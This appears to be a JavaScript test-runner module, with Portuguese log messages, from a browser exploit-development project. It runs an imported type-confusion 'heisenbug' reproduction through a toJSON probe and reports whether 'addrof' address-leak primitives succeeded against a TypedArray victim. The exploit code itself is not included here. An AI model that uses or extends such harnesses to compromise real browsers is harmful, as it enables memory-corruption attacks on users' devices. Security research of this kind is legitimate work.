// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofTest_EnlargeLeakTargets, // NOME DA FUNÇÃO ATUALIZADO
    FNAME_MODULE_TYPEDARRAY_ADDROF_V43_ELT // NOME DO MÓDULO ATUALIZADO
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_EnlargeLeakTargets";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (EnlargeLeakTargets) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofTest_EnlargeLeakTargets();

    logS3(`  Total de chamadas da sonda toJSON: ${result.total_probe_calls || 0}`, "info", FNAME_RUNNER);
    if (result.all_probe_calls_for_analysis && result.all_probe_calls_for_analysis.length > 0) {
        logS3(`  Detalhes de TODAS as chamadas da sonda: ${JSON.stringify(result.all_probe_calls_for_analysis)}`, "dev_verbose");
    }

    if (result.errorOccurred) {
        logS3(`  RESULTADO: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}.`, "error", FNAME_RUNNER);
        document.title = `Heisenbug (TypedArray-ELT) ERR: ${result.errorOccurred.name}`;
        if (result.errorOccurred.name === 'TypeError' && result.errorOccurred.message.includes("circular structure")) {
            logS3(`    NOTA: TypeError de estrutura circular. Isso é esperado se o objeto C1 modificado foi serializado com sucesso pelo stringify principal e depois novamente pelo logger do runner.`, "info");
        }
    } else {
        logS3(`  RESULTADO: Completou. Estado final do objeto C1_details (retornado por P1, modificado em P2+): ${result.toJSON_details ? JSON.stringify(result.toJSON_details) : 'N/A'}`, "good", FNAME_RUNNER);
        logS3(`  Stringify Output Final (Parseado): ${result.stringifyResult ? JSON.stringify(result.stringifyResult) : 'N/A'}`, "info", FNAME_RUNNER);

        let heisenbugOnC1 = false;
        const call2Details = result.all_probe_calls_for_analysis.find(d => d.call_number === 2);
        if (call2Details && call2Details.this_is_C1_details_obj && call2Details.payload_A_assigned) {
            heisenbugOnC1 = true;
        }

        if(heisenbugOnC1){
            logS3(`  !!!! HEISENBUG & PAYLOAD ASSIGNMENT CONFIRMADAS PELA SONDA !!!!`, "critical", FNAME_RUNNER);
        } else {
            logS3(`  ALERT: Heisenbug/Payload Assignment NÃO CONFIRMADA PELA SONDA.`, "error", FNAME_RUNNER);
        }

        let anyAddrofSuccess = false;
        if (result.addrof_A_result && result.addrof_A_result.success) {
            logS3(`    ADDROF A SUCESSO! ${result.addrof_A_result.msg}`, "vuln", FNAME_RUNNER); anyAddrofSuccess = true;
        } else if (result.addrof_A_result) {
            logS3(`    ADDROF A FALHOU: ${result.addrof_A_result.msg}`, "warn", FNAME_RUNNER);
        }
        if (result.addrof_B_result && result.addrof_B_result.success) {
            logS3(`    ADDROF B SUCESSO! ${result.addrof_B_result.msg}`, "vuln", FNAME_RUNNER); anyAddrofSuccess = true;
        } else if (result.addrof_B_result) {
            logS3(`    ADDROF B FALHOU: ${result.addrof_B_result.msg}`, "warn", FNAME_RUNNER);
        }

        let lastCallProbeDetails = null;
        if(result.all_probe_calls_for_analysis && result.all_probe_calls_for_analysis.length > 0){
            lastCallProbeDetails = result.all_probe_calls_for_analysis[result.all_probe_calls_for_analysis.length-1];
        }
        if (lastCallProbeDetails && lastCallProbeDetails.error_in_probe) {
            logS3(`    ERRO INTERNO NA ÚLTIMA SONDA REGISTRADA: ${lastCallProbeDetails.error_in_probe}`, "warn", FNAME_RUNNER);
        }

        if (anyAddrofSuccess) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V43_ELT}: Addr SUCCESS!`;
        } else if (heisenbugOnC1) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V43_ELT}: C1_TC OK, Addr Fail`;
        } else {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V43_ELT}: No C1_TC?`;
        }
    }
    logS3(`  Título da página: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`==== Estratégia de Reprodução do Heisenbug (EnlargeLeakTargets) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V43_ELT}_MainOrchestrator`;
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== User Agent: ${navigator.userAgent} ====`,'info', FNAME_ORCHESTRATOR);
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Reproduzindo Heisenbug com TypedArray Vítima (EnlargeLeakTargets) ====`, 'test', FNAME_ORCHESTRATOR);

    await runHeisenbugReproStrategy_TypedArrayVictim();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (runBtn) runBtn.disabled = false;

    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V43_ELT)) {
        if (!document.title.includes("CRASH") && !document.title.includes("RangeError") &&
            !document.title.includes("SUCCESS") && !document.title.includes("Addr Fail") &&
            !document.title.includes("ERR") && !document.title.includes("C1_TC OK")) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V43_ELT} Concluído`;
        }
    }
}
